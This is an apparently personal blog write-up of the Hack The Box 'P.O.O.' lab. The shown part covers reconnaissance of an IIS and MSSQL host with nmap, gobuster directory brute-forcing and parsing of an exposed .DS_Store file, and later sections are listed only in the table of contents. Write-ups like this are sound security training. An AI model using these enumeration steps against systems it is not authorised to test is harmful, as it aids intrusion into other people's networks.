          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://twitter.com/v1c70r_n00b"
          target="_blank"
          aria-label="X-Twitter"
          title="X-Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span></a
        >
      
    
  </div>

</div>
  </div>
</div>

  

  

  
    <div class="mb-5"></div>
  

      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#machine-info">Machine Info</a></li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
        <li><a href="#ds_store-enumeration">.DS_Store Enumeration</a></li>
        <li><a href="#iis-shortnames">IIS Shortnames</a></li>
        <li><a href="#file-fuzzing">File fuzzing</a></li>
      </ul>
    </li>
    <li><a href="#huh">Huh?!</a>
      <ul>
        <li><a href="#mssql-enumeration">MSSQL Enumeration.</a></li>
        <li><a href="#linked-servers"><strong>Linked Servers</strong></a>
          <ul>
            <li><a href="#enumeration-1">Enumeration</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#backtrack">BackTrack</a>
      <ul>
        <li><a href="#privilege-escalation">Privilege escalation</a></li>
      </ul>
    </li>
    <li><a href="#foothold">Foothold</a>
      <ul>
        <li><a href="#local-enumeration">Local Enumeration</a></li>
      </ul>
    </li>
    <li><a href="#p00ned">p00ned</a>
      <ul>
        <li><a href="#kerberoasting">Kerberoasting</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#machine-info">Machine Info</a></li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
        <li><a href="#ds_store-enumeration">.DS_Store Enumeration</a></li>
        <li><a href="#iis-shortnames">IIS Shortnames</a></li>
        <li><a href="#file-fuzzing">File fuzzing</a></li>
      </ul>
    </li>
    <li><a href="#huh">Huh?!</a>
      <ul>
        <li><a href="#mssql-enumeration">MSSQL Enumeration.</a></li>
        <li><a href="#linked-servers"><strong>Linked Servers</strong></a>
          <ul>
            <li><a href="#enumeration-1">Enumeration</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#backtrack">BackTrack</a>
      <ul>
        <li><a href="#privilege-escalation">Privilege escalation</a></li>
      </ul>
    </li>
    <li><a href="#foothold">Foothold</a>
      <ul>
        <li><a href="#local-enumeration">Local Enumeration</a></li>
      </ul>
    </li>
    <li><a href="#p00ned">p00ned</a>
      <ul>
        <li><a href="#kerberoasting">Kerberoasting</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'
    let isJumpingToAnchor = false

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      if (isJumpingToAnchor) {
        for (let i = 0; i < anchors.length; i++) {
          const anchor = anchors[i]
          if (!tocIds.has(anchor.id)) continue
          const top = anchor.getBoundingClientRect().top + window.scrollY
          if (Math.abs(window.scrollY - top) < 100) {
            return anchor.id
          }
        }
      }

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = true
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      links.forEach(link => {
        link.addEventListener('click', () => {
          isJumpingToAnchor = true
        })
      })

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          
<h1 class="relative group">Machine Info
    <div id="machine-info" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#machine-info" aria-label="Anchor">#</a>
    </span>
    
</h1>
<blockquote>
<p>Professional Offensive Operations
By <a
  href="https://app.hackthebox.com/home/users/profile/302"
    target="_blank"
  >eks</a> and <a
  href="https://app.hackthebox.com/home/users/profile/2984"
    target="_blank"
  >mrb3n</a>
Professional Offensive Operations is a rising name in the cyber security world.
Lately they&rsquo;ve been working into migrating core services and
components to a state of the art cluster which offers cutting edge
software and hardware.
P.O.O. is designed to put your skills in enumeration, lateral
movement, and privilege escalation to the test within a small Active
Directory environment that is configured with the latest operating
systems and technologies.
The goal is to compromise the perimeter host, escalate privileges and
ultimately compromise the domain while collecting several flags along
the way.
Entry Point: <code>10.13.38.11</code>
Aside from the above, we are to get our foothold onto the macine through a n sql server and pivot our way from there to the admin level.</p>
</blockquote>

<h1 class="relative group">Enumeration
    <div id="enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration" aria-label="Anchor">#</a>
    </span>
    
</h1>
<p>We shall start first by seeing if our entry point is accessible by pinging it as seen below.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="image.png"
    width="592"
    height="213"
    src="/posts/p.o.o/image.png"
    srcset="/posts/p.o.o/image.png 800w, /posts/p.o.o/image.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/posts/p.o.o/image.png"></figure>
<p>Our entry point is accessible, we shall then proceed to scan our IP for open ports using nmap.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nmap -sCV 10.13.38.11       
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-07 04:23 EAT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.13.38.11
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http     Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s Microsoft SQL Server <span class="m">2017</span> 14.00.2056.00<span class="p">;</span> RTM+
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-10-06T09:29:44
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2054-10-06T09:29:44
</span></span><span class="line"><span class="cl"><span class="p">|</span> ms-sql-info: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   10.13.38.11:1433: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Version: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>       name: Microsoft SQL Server <span class="m">2017</span> RTM+
</span></span><span class="line"><span class="cl"><span class="p">|</span>       number: 14.00.2056.00
</span></span><span class="line"><span class="cl"><span class="p">|</span>       Product: Microsoft SQL Server <span class="m">2017</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>       Service pack level: RTM
</span></span><span class="line"><span class="cl"><span class="p">|</span>       Post-SP patches applied: <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    TCP port: <span class="m">1433</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-10-07T01:24:34+00:00<span class="p">;</span> +3s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> ms-sql-ntlm-info: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   10.13.38.11:1433: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Target_Name: POO
</span></span><span class="line"><span class="cl"><span class="p">|</span>     NetBIOS_Domain_Name: POO
</span></span><span class="line"><span class="cl"><span class="p">|</span>     NetBIOS_Computer_Name: COMPATIBILITY
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Domain_Name: intranet.poo
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Computer_Name: COMPATIBILITY.intranet.poo
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Tree_Name: intranet.poo
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Product_Version: 10.0.17763
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2s, deviation: 0s, median: 2s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 33.84 seconds
</span></span></code></pre></div><p>As seen above, we have two open ports, 80, 1443. we shall start by seeing what is on port 80</p>

<h2 class="relative group">HTTP Enumeration
    <div id="http-enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#http-enumeration" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>We are met with an IIS server page.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="image.png"
    src="image%201.png"
    ></figure>
<p>we shall try to do directory fuzzing to see what directories are available using gobuster. I found some interesting directories, as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.13.38.11:80          
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.13.38.11:80
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 152<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/templates            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 155<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/templates/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 152<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/themes/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 153<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/uploads/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/Images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 152<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/Images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 401<span class="o">)</span> <span class="o">[</span>Size: 1293<span class="o">]</span>
</span></span><span class="line"><span class="cl">/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 153<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/plugins/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/dev                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 149<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/dev/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 148<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/Themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 152<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/Themes/<span class="o">]</span>                                                                               
</span></span><span class="line"><span class="cl">Progress: <span class="m">1786</span> / <span class="m">220561</span> <span class="o">(</span>0.81%<span class="o">)</span>^C
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Keyboard interrupt detected, terminating.
</span></span><span class="line"><span class="cl">Progress: <span class="m">1801</span> / <span class="m">220561</span> <span class="o">(</span>0.82%<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>there is an admin and uploads page, lets try to visit it to see what we can find.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="image.png"
    src="image%202.png"
    ></figure>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="image.png"
    src="image%203.png"
    ></figure>
<p>We are required to log in but we do not have a clue of any user, however, after trying to log in with the user admin and password as admin, still nothing. Therefore we shall continue with enumeration with a big wordlist to see if we can find anything that is of interest to us, this time I used the wordlist <code>raft-large-words-lowercase.txt</code>I found an interesting directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -u http://10.13.38.11:80           
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.13.38.11:80
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 152<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/templates            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 155<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/templates/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 401<span class="o">)</span> <span class="o">[</span>Size: 1293<span class="o">]</span>
</span></span><span class="line"><span class="cl">/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 153<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/plugins/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 148<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 152<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/themes/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 153<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/uploads/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/dev                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 149<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/dev/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/.                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 703<span class="o">]</span>
</span></span><span class="line"><span class="cl">/widgets              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 153<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/widgets/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/meta-inf             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 154<span class="o">]</span> <span class="o">[</span>--&gt; http://10.13.38.11:80/meta-inf/<span class="o">]</span>                                                                             
</span></span><span class="line"><span class="cl">/.ds_store            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10244<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">9547</span> / <span class="m">107983</span> <span class="o">(</span>8.84%<span class="o">)</span>^C
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Keyboard interrupt detected, terminating.
</span></span><span class="line"><span class="cl">Progress: <span class="m">9557</span> / <span class="m">107983</span> <span class="o">(</span>8.85%<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>.ds_store</p>

<h2 class="relative group">.DS_Store Enumeration
    <div id="ds_store-enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ds_store-enumeration" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p><code>.DS_Store</code> files are actually <a
  href="https://en.wikipedia.org/wiki/.DS_Store"
    target="_blank"
  >created by MacOS</a> when it visits a directory. They store attributes of the folder and the files within it. Likely here the site was developed on a Mac and then
deployed to this Windows server. The structure of the <code>.ds_store</code> file is proprietary, but it has been reversed (see <a
  href="https://0day.work/parsing-the-ds_store-file-format/"
    target="_blank"
  >this post</a> for an excellent deep dive).</p>
<p>I first found the <a
  href="https://github.com/gehaxelt/Python-dsstore"
    target="_blank"
  >Python-dsstore</a> tool to parse <code>.DS_Store</code> files, then later learned of <a
  href="https://github.com/Keramas/DS_Walk"
    target="_blank"
  >DS_Walk</a>, which uses <code>dsstore.py</code> to recursively walk a webserver. I will clone the repo and parse it the webserver</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>n00b㉿v1c70r<span class="o">)</span>-<span class="o">[</span>~/HTB Prolabs/P.O.O/.ds_store/DS_Walk<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 ds_walk.py -u http://10.13.38.11
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> .ds_store file is present on the webserver.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating directories based on .ds_server file:
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/admin
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/iisstart.htm
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Images
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/JS
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/META-INF
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/New folder
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/New folder <span class="o">(</span>2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Plugins
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Templates
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Themes
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Uploads
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/web.config
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Widgets
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
</span></span><span class="line"><span class="cl">----------------------------
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Images/buttons
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Images/icons
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> http://10.13.38.11/Images/iisstart.png
</span></span><span class="line"><span class="cl">----------------------------
